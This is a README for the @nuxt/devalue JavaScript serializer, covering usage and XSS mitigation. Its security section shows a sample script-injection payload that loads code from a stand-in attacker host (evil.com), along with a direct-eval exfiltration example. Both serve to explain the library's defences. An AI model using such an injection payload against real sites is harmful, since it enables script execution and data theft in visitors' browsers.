# @nuxt/devalue

[![npm version][npm-version-src]][npm-version-href]
[![npm downloads][npm-downloads-src]][npm-downloads-href]
[![Circle CI][circleci-src]][circleci-href]
[![package phobia][package-phobia-src]][package-phobia-href]
[![bundle phobia][bundle-phobia-src]][bundle-phobia-href]

> Forked from [devalue](https://github.com/Rich-Harris/devalue) to log errors on non-serializable properties rather than throwing `Error`.

Like `JSON.stringify`, but handles

* cyclical references (`obj.self = obj`)
* repeated references (`[value, value]`)
* `undefined`, `Infinity`, `NaN`, `-0`
* regular expressions
* dates
* `Map` and `Set`
* `.toJSON()` method for non-POJOs

Try it out on [runkit.com](https://npm.runkit.com/@nuxt/devalue).

## Goals:

* Performance
* Security (see [XSS mitigation](#xss-mitigation))
* Compact output


## Non-goals:

* Human-readable output
* Stringifying functions or arbritary non-POJOs


## Usage

```js
import devalue from '@nuxt/devalue';

let obj = { a: 1, b: 2 };
obj.c = 3;

devalue(obj); // '{a:1,b:2,c:3}'

obj.self = obj;
devalue(obj); // '(function(a){a.a=1;a.b=2;a.c=3;a.self=a;return a}({}))'
```

If `devalue` encounters a function or a non-POJO, it will throw an error.


## XSS mitigation

Say you're server-rendering a page and want to serialize some state, which could include user input. `JSON.stringify` doesn't protect against XSS attacks:

```js
const state = {
  userinput: `</script><script src='https://evil.com/mwahaha.js'>`
};

const template = `
<script>
  // NEVER DO THIS
  var preloaded = ${JSON.stringify(state)};
</script>`;
```

Which would result in this:

```html
<script>
  // NEVER DO THIS
  var preloaded = {"userinput":"</script><script src='https://evil.com/mwahaha.js'>"};
</script>
```

Using `devalue`, we're protected against that attack:

```js
const template = `
<script>
  var preloaded = ${devalue(state)};
</script>`;
```

```html
<script>
  var preloaded = {userinput:"\\u003C\\u002Fscript\\u003E\\u003Cscript src=\'https:\\u002F\\u002Fevil.com\\u002Fmwahaha.js\'\\u003E"};
</script>
```

This, along with the fact that `devalue` bails on functions and non-POJOs, stops attackers from executing arbitrary code. Strings generated by `devalue` can be safely deserialized with `eval` or `new Function`:

```js
const value = (0,eval)('(' + str + ')');
```


## Other security considerations

While `devalue` prevents the XSS vulnerability shown above, meaning you can use it to send data from server to client, **you should not send user data from client to server** using the same method. Since it has to be evaluated, an attacker that successfully submitted data that bypassed `devalue` would have access to your system.

When using `eval`, ensure that you call it *indirectly* so that the evaluated code doesn't have access to the surrounding scope:

```js
{
  const sensitiveData = 'Setec Astronomy';
  eval('sendToEvilServer(sensitiveData)'); // pwned :(
  (0,eval)('sendToEvilServer(sensitiveData)'); // nice try, evildoer!
}
```

Using `new Function(code)` is akin to using indirect eval.


## See also

* [lave](https://github.com/jed/lave) by Jed Schmidt
* [arson](https://github.com/benjamn/arson) by Ben Newman
* [tosource](https://github.com/marcello3d/node-tosource) by Marcello Bastéa-Forte
* [serialize-javascript](https://github.com/yahoo/serialize-javascript) by Eric Ferraiuolo


## License

[LIL](LICENSE)

<!-- Refs -->
[npm-version-src]: https://flat.badgen.net/npm/v/@nuxtjs/devalue/latest
[npm-version-href]: https://npmjs.com/package/@nuxtjs/devalue

[npm-downloads-src]: https://flat.badgen.net/npm/dm/@nuxtjs/devalue
[npm-downloads-href]: https://npmjs.com/package/@nuxtjs/devalue

[circleci-src]: https://flat.badgen.net/circleci/github/nuxt/devalue
[circleci-href]: https://circleci.com/gh/nuxt/devalue

[package-phobia-src]: https://flat.badgen.net/packagephobia/install/@nuxtjs/devalue
[package-phobia-href]: https://packagephobia.now.sh/result?p=@nuxtjs/devalue

[bundle-phobia-src]: https://flat.badgen.net/bundlephobia/minzip/@nuxtjs/devalue
[bundle-phobia-href]: https://bundlephobia.com/result?p=@nuxtjs/devalue
